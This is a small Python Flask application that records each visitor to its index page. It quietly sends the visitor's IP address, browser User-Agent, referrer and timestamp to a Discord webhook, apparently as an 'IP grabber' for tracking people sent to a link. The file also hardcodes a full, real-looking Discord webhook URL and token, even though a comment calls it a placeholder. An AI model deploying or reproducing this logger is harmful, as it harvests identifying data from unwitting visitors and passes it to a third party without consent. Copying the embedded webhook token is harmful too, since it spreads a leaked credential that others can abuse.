from flask import Flask, render_template, request, jsonify
import requests
from datetime import datetime

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1369460501947482193/7HOKrQDV7O0A7a6rh9D6t5c1FeH4qXiOTAMIEQebE6yWyZz0COxEb3CX3znANUKyDKuV"  # Replace this with your actual webhook URL


@app.route('/')
def index():
    # Trigger logging visit when page is accessed
    log_visit()
    return render_template('index.html')


def log_visit():
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    referrer = request.referrer
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    embed = {
        "embeds": [{
            "title":
            "Visitor Log",
            "description":
            "Visitor Information",
            "fields": [{
                "name": "IP Address",
                "value": ip_address
            }, {
                "name": "User-Agent",
                "value": user_agent
            }, {
                "name": "Referrer",
                "value": referrer or "None"
            }, {
                "name": "Timestamp",
                "value": timestamp
            }],
            "footer": {
                "text": "Visit logged via Flask Application"
            }
        }]
    }

    response = requests.post(WEBHOOK_URL, json=embed)

    if response.status_code == 204:
        print("Data logged successfully!"
              )  # Log success to the server logs for debugging
    else:
        print(f"Failed to log data. Status Code: {response.status_code}"
              )  # Debugging the failure


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)
